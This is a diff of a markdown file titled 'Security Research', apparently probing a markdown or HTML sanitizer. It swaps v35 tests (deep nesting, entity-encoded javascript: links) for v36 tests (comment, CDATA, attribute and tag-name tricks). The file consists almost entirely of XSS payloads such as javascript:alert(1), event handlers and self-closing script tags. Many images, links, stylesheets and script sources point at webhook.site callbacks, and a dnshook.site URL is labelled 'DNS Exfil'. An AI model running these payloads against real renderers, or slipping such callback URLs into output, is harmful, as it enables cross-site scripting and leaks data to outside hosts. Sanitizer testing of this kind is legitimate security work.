@@ -1,162 +1,190 @@
-# Security Research - v35
+# Security Research - v36
 
-## Deep Nesting & Edge Case Testing
+## HTML Comment & Attribute Injection Testing
 
-Testing nested elements, Unicode attributes, and other edge cases.
-
----
-
-### 1) Deep KBD Nesting (10 levels)
-
-<kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd><kbd>
-Deeply nested content - does this break anything?
-</kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd></kbd>
+Testing comment handling, CDATA sections, and attribute-based attacks.
 
 ---
 
-### 2) Deep DIV Nesting (15 levels)
+### 1) HTML Comment Variations
 
-<div><div><div><div><div><div><div><div><div><div><div><div><div><div><div>
-Very deeply nested div content
-</div></div></div></div></div></div></div></div></div></div></div></div></div></div></div>
+<!-- Normal comment -->
 
----
+<!- Single dash comment -->
 
-### 3) Mixed Deep Nesting
+<!--- Triple dash comment --->
 
-<div><kbd><table><tr><td><div><kbd><table><tr><td>
-Mixed nesting
-</td></tr></table></kbd></div></td></tr></table></kbd></div>
+<!--> Truncated comment -->
 
----
+<!--x<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/comment-img.gif">-->
 
-### 4) Unicode in ID Attribute
-
-<h4 id="❤️🔥✨">Unicode Emoji ID</h4>
-
-[Link to emoji ID](#❤️🔥✨)
-
-<h4 id="<script>">Script in ID</h4>
-
-[Link to script ID](#<script>)
+<!----><img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/double-dash-img.gif"><!---->
 
 ---
 
-### 5) Very Long ID
+### 2) CDATA Sections
 
-<h4 id="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa">Very Long ID Test</h4>
-
----
-
-### 6) HTML Entities in Links
-
-<a href="javascript&#58;alert(1)">JS Entity Test 1</a>
-
-<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">JS Entity Test 2</a>
-
-<a href="data&#58;text/html,<script>alert(1)</script>">Data Entity Test</a>
+<![CDATA[<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/cdata-img.gif">]]>
 
 ---
 
-### 7) Multiple Images Same URL
+### 3) Processing Instructions
 
-![img1](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
-![img2](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
-![img3](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
-![img4](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
-![img5](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/multi-1.gif)
+<?xml version="1.0"?>
+<?xml-stylesheet href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/pi-style.css"?>
 
 ---
 
-### 8) Object/Embed Tags (should be stripped)
+### 4) Null Byte Injection
 
-<object data="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/object.swf"></object>
+<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/null%00byte.gif">
 
-<embed src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/embed.swf">
-
----
-
-### 9) SVG Tag (should be stripped)
-
-<svg onload="alert(1)">
-  <image href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/svg-image.gif"></image>
-</svg>
+<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/null%00link">Null in href</a>
 
 ---
 
-### 10) Video/Audio Tags (should be stripped)
+### 5) Attribute Without Quotes
 
-<video src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/video.mp4"></video>
+<a href=https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/no-quotes-href>No Quotes Link</a>
 
-<audio src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/audio.mp3"></audio>
-
----
-
-### 11) Form Elements (should be stripped)
-
-<form action="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/form">
-<input type="text" name="test">
-<button type="submit">Submit</button>
-</form>
+<img src=https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/no-quotes-img.gif>
 
 ---
 
-### 12) Meta/Link Tags (should be stripped)
+### 6) Mixed Quote Styles
 
-<meta http-equiv="refresh" content="0;url=https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/meta-refresh">
+<a href='https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/single-quote'>Single Quotes</a>
 
-<link rel="stylesheet" href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/style.css">
-
----
-
-### 13) Base Tag (should be stripped)
-
-<base href="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/">
+<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/double-quote">Double Quotes</a>
 
 ---
 
-### 14) IFrame (should be stripped)
+### 7) Attribute Order Manipulation
 
-<iframe src="https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/iframe.html"></iframe>
+<a onclick="alert(1)" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/attr-order1">Onclick First</a>
 
----
-
-### 15) Event Handlers (should be stripped)
-
-<div onclick="alert(1)">Click me onclick</div>
-
-<img src="x" onerror="alert(1)">
-
-<body onload="alert(1)">
-
-<svg/onload="alert(1)">
-
-<input onfocus="alert(1)" autofocus>
+<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/attr-order2" onclick="alert(1)">Href First</a>
 
 ---
 
-### 16) Markdown Image with Event Handler
+### 8) Duplicate Attributes
 
-![test](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/md-img.gif "onerror=alert(1)")
+<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-first" href="javascript:alert(1)">Duplicate href</a>
+
+<a href="javascript:alert(1)" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-second">Duplicate href reversed</a>
+
+<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/dup-img-first.gif" src="javascript:alert(1)">
 
 ---
 
-### 17) Link with Data URI
+### 9) Newlines in Attributes
 
-[Data URI Link](data:text/html,<script>alert(1)</script>)
+<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/newline
+link">Newline in href</a>
 
-[Data Image](data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)
+<a href="java
+script:alert(1)">JS with newline</a>
+
+---
+
+### 10) Tab Characters in Protocol
+
+<a href="java	script:alert(1)">JS with tab</a>
+
+<a href="	javascript:alert(1)">Leading tab JS</a>
+
+---
+
+### 11) Entity Encoded Tags
+
+&lt;script&gt;alert(1)&lt;/script&gt;
+
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+---
+
+### 12) Backtick Attribute Delimiter
+
+<a href=`https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/backtick`>Backtick href</a>
+
+---
+
+### 13) Tag Name Confusion
+
+<a/href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/slash-sep">Slash separator</a>
+
+<a	href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/tab-sep">Tab separator</a>
+
+<a
+href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/newline-sep">Newline separator</a>
+
+---
+
+### 14) Unicode Tag Names
+
+<а href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/cyrillic-a">Cyrillic A tag</а>
+
+<ａ href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/fullwidth-a">Fullwidth A tag</ａ>
+
+---
+
+### 15) Self-Closing Tag Abuse
+
+<script/src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/script-self-close.js"/>
+
+<img/src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/img-self-close.gif"/>
+
+---
+
+### 16) XML Namespace Injection
+
+<a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/xmlns-link">XLink href</a>
+
+<svg:a xmlns:svg="http://www.w3.org/2000/svg" href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/svg-xmlns">SVG namespaced</svg:a>
+
+---
+
+### 17) CSS Expression Attempt
+
+<div style="background:url(https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/css-bg.gif)">CSS bg</div>
+
+<div style="list-style-image:url(https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/css-list.gif)">CSS list</div>
+
+---
+
+### 18) srcset Attribute
+
+<img srcset="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/srcset-1x.gif 1x, https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/srcset-2x.gif 2x">
+
+---
+
+### 19) Picture Element
+
+<picture>
+<source srcset="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/picture-source.gif">
+<img src="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/picture-fallback.gif">
+</picture>
+
+---
+
+### 20) Template Literal Injection
+
+<div data-test="${alert(1)}">Template literal in data attr</div>
+
+<a href="https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/${location.href}">Template in URL</a>
 
 ---
 
 ### DNS Exfil
 
-![dns](https://v35-dns.503e9388-e477-46a6-8a58-3a627c4fdb86.dnshook.site/dns.gif)
+![dns](https://v36-dns.b54c2a11-5e05-48b6-88fd-1ea979df7f5b.dnshook.site/dns.gif)
 
 ### Canary
 
-![canary](https://webhook.site/503e9388-e477-46a6-8a58-3a627c4fdb86/v35-canary.gif)
+![canary](https://webhook.site/b54c2a11-5e05-48b6-88fd-1ea979df7f5b/v36-canary.gif)
 
 ---
 
-*v35 - Deep nesting & edge case testing*
+*v36 - HTML comments, CDATA, and attribute injection*
